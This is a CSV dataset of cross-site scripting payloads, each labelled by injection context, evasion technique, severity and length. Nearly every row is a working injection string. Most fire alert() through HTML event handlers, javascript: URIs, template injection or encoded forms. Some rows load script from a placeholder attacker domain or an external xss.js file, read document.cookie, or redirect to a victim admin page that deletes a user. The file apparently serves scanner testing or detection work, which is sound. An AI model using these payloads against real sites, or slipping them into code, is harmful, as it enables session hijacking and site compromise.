payload,context,technique,severity,length
"<frameset oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101
"<BASE HREF=""javascript:javascript:alert(6507);//"">",js_uri,case_variation,medium,50
"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,58
<button popovertarget=x>Click me</button><img ontoggle=alert(1) popover id=x>AnonKryptiQuz</img>,tag_injection,none,medium,96
"<code draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</code>",tag_injection,none,medium,85
"<form><a href=""javascript:\u0061lert(1)"">X",js_uri,unicode_escape,low,42
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",tag_injection,none,medium,109
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(9282)"">X",js_uri,none,medium,86
"a=alert,a(1)",generic,none,low,12
"<q onmouseout=""alert(1)"">AnonKryptiQuz</q>",tag_injection,none,medium,42
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,generic,html_entity,low,78
"window['alXert’ .replace(/X/, "")|(self[document'][cookie'])",generic,none,low,59
"<label onmouseout=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,50
"<em onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</em>",tag_injection,none,medium,64
"<textarea onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</textarea>",tag_injection,none,medium,91
"<address onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,87
<svg onload%09%20%28%2c%3b=alert(1)>,generic,url_encoding,medium,36
<footer onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable style=display:block>drop here</multicol>",tag_injection,none,medium,137
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",dom_sink,html_entity,low,55
<tr onpointerover=alert(1) style=display:block>AnonKryptiQuz</tr>,tag_injection,none,medium,65
"<p draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,55
<ul onpointerover=alert(1) style=display:block>AnonKryptiQuz</ul>,tag_injection,none,medium,65
"<svg onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</svg>",tag_injection,none,medium,64
"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(""x='\""+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\""'"");}}}}",template_injection,unicode_escape|encoding,medium,124
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,tag_injection,none,medium,71
"""><script+src=""https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert""></script>",script_injection,none,low,106
"<IMG SRC=""jav&#x0A;ascript:alert('AnonKryptiQuz');"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,52
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable style=display:block>drop here</image>",tag_injection,none,medium,131
"<menu onclick=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,65
"<style oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98
"<del onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,82
"<caption oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,77
"<div id=""132""><!doctype html>",attribute_escape,none,low,29
><script>alert(123)</script>,script_injection,none,medium,28
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",tag_injection,none,medium,124
<svg><area onload=alert(1)></area>,tag_injection,none,medium,34
"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",tag_injection,none,medium,111
"<footer onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,87
"<sub onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</sub>",tag_injection,none,medium,63
<samp id=x tabindex=1 onfocusin=alert(1)></samp>,tag_injection,none,medium,48
"<listing draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,90
<STYLE>@im\port'\ja\vasc\ript:alert(4421)';</STYLE>,generic,case_variation,medium,51
"<nav onmousemove=""alert(1)"">AnonKryptiQuz</nav>",tag_injection,none,medium,47
<body onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
<set onpointerenter=alert(1) style=display:block>AnonKryptiQuz</set>,tag_injection,none,medium,68
"<form onmouseleave=""alert(1)"">AnonKryptiQuz</form>",tag_injection,none,medium,50
"<content onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,71
"<small onmouseover=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,51
<element onpointerup=alert(1) style=display:block>AnonKryptiQuz</element>,tag_injection,none,medium,73
<dir id=x tabindex=1 onfocusin=alert(1)></dir>,tag_injection,none,medium,46
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",js_uri,none,medium,63
%3Cbutton%20onclick%3D%60alert%28%2FAnonKryptiQuz%2F%29%60%3EClick%20me%3C%2Fbutton%3E,generic,url_encoding,low,86
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",generic,comment_injection|case_variation,low,110
<button popovertarget=x>Click me</button><nav onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</nav>,tag_injection,none,medium,102
"<svg onLoad svg onLoad=""javascript:javascript:alert(4906)""></svg onLoad>",js_uri,none,medium,72
<sub onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
"<div onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</div>",tag_injection,none,medium,66
"ABC<div style=""x:exp\x00ression(javascript:alert(0502)"">DEF",js_uri,none,medium,59
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60
"<header onmouseover=""alert(1)"">AnonKryptiQuz</header>",tag_injection,none,medium,53
"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></ruby>",tag_injection,none,medium,112
<a?/onclick=(confirm)(document.cookie)>Click Here!,dom_sink,none,high,50
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable style=display:block>drop here</tfoot>",tag_injection,none,medium,131
"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>",tag_injection,none,medium,105
<svg/onload=alert('AnonKryptiQuz')>,tag_injection,none,medium,35
"<label oncontextmenu=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,53
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationstart=""alert(1)""></noscript>",tag_injection,none,medium,103
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(5412)>"">",js_uri,html_entity,medium,64
<param onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<applet onclick=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",tag_injection,none,medium,69
<pre id=x tabindex=1 onfocus=alert(1)></pre>,tag_injection,none,medium,44
"<track oncuechange=""alert('AnonKryptiQuz')""></track>",tag_injection,none,medium,52
"<style>:target {color: red;}</style><nextid id=x style=""transition:color 10s"" ontransitioncancel=print()></nextid>",tag_injection,none,low,114
"<figure onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",tag_injection,none,medium,70
"<spacer onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,73
"<applet oncontextmenu=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,55
<em onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</em><input value=clickme>,tag_injection,none,medium,95
"<table onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</table>",tag_injection,none,medium,71
"<hgroup onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",tag_injection,none,medium,69
<link id=x tabindex=1 onactivate=alert(1)></link>,tag_injection,none,medium,49
"<a href=""javas\x06cript:javascript:alert(5943)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74
"<b oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,95
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationstart=""alert(1)""></datalist>",tag_injection,none,medium,103
"<dl onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",tag_injection,none,medium,59
"<tbody oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",tag_injection,none,medium,62
"<address onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,76
"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,63
"<area onmousemove=""alert(1)"">AnonKryptiQuz</area>",tag_injection,none,medium,49
"<script>’alert(1)’.replace(/.+/,eval)</script>",script_injection,none,medium,46
"<shadow onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,70
"<audio onerror=""javascript:alert(1)""><source>//INJECTX",js_uri,none,medium,54
"<pre draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</pre>",tag_injection,none,medium,62
'te' - alert('-') - 'xt';,attribute_escape,none,medium,25
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=print()></element>",tag_injection,none,low,116
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,generic,url_encoding,low,85
"<strong onmouseout=""alert(1)"">AnonKryptiQuz</strong>",tag_injection,none,medium,52
"<img draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</img>",tag_injection,none,medium,82
<del onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
<body onmessage=print()>,tag_injection,none,low,24
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=print()></li>",tag_injection,none,low,106
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,tag_injection,none,medium,62
<input onauxclick=alert(1)>,tag_injection,none,medium,27
&#x3C;script&#x3E;alert(1)&#x3C;&#x2F;script&#x3E;,generic,html_entity,medium,50
"<svg onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,67
"<a href=""ja%0Dva%0Dscr%0Dipt:aler%0Dt(1)"">",attribute_escape,url_encoding,low,42
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></bdo>",tag_injection,none,medium,110
"<div onmouseenter=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,48
<nav contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,57
<button popovertarget=x>Click me</button><title ontoggle=alert(1) popover id=x>AnonKryptiQuz</title>,tag_injection,none,medium,100
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",js_uri,none,medium,64
"<b onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,63
"<sub draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,64
</script><script>alert(1)</script>,script_injection,none,medium,34
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationstart=""alert(1)""></image3>",tag_injection,none,medium,99
<span contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,58
%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E,dom_sink,url_encoding,low,70
<iframe/onload=alert(0);>,tag_injection,none,medium,25
"<abbr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,70
"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></code>",tag_injection,none,medium,168
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",tag_injection,none,medium,106
"<applet onerror applet onerror=""javascript:javascript:alert(6823)""></applet onerror>",js_uri,none,medium,84
"<textarea draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",tag_injection,none,medium,93
"<meter onmouseleave=""alert(1)"">AnonKryptiQuz</meter>",tag_injection,none,medium,52
"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",tag_injection,none,medium,115
<nav onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53
"<object ondblclick=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,52
"<a onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,63
"<multicol onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",tag_injection,none,medium,78
"<div STYLE=""width: expression(document.vulnerable=true);"">",dom_sink,none,low,58
<area onpointerleave=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,70
"goto,javascript:alert(1)"",",js_uri,none,medium,26
"<audio2 oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",tag_injection,none,medium,91
<img+src=1+onerror=alert(1)>&anything_else=AnonKryptiQuz,tag_injection,none,medium,56
<button popovertarget=x>Click me</button><picture ontoggle=alert(1) popover id=x>AnonKryptiQuz</picture>,tag_injection,none,medium,104
"<nobr onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",tag_injection,none,medium,65
"<time onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,69
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></fieldset>",tag_injection,none,medium,176
"<iframe draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",tag_injection,none,medium,90
<!-- --\x3E> <img src=xxx:x onerror=javascript:alert(3261)> -->,js_uri,comment_injection,medium,63
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>,tag_injection,none,medium,90
"""><script src=//[ATTACKER.DOMAIN.TLD]></script>",script_injection,none,low,47
"<style>:target {transform: rotate(180deg);}</style><time id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></time>",tag_injection,none,medium,126
"<animatetransform onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,105
"<dl draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</dl>",tag_injection,none,medium,62
<optgroup onpointerup=alert(1) style=display:block>AnonKryptiQuz</optgroup>,tag_injection,none,medium,75
<param onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67
"<blink onmouseenter=""alert(1)"">AnonKryptiQuz</blink>",tag_injection,none,medium,52
"<kbd draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,84
"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",tag_injection,none,medium,110
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,tag_injection,none,medium,72
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></h1>",tag_injection,none,medium,104
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",js_uri,none,medium,83
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>,attribute_escape,none,low,66
<figure onpointerdown=alert(1) style=display:block>AnonKryptiQuz</figure>,tag_injection,none,medium,73
"ryp3i""accesskey=""x""onclick=""alert(1)""//opk15",event_handler,none,medium,44
<multicol onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</multicol><input value=clickme>,tag_injection,none,medium,107
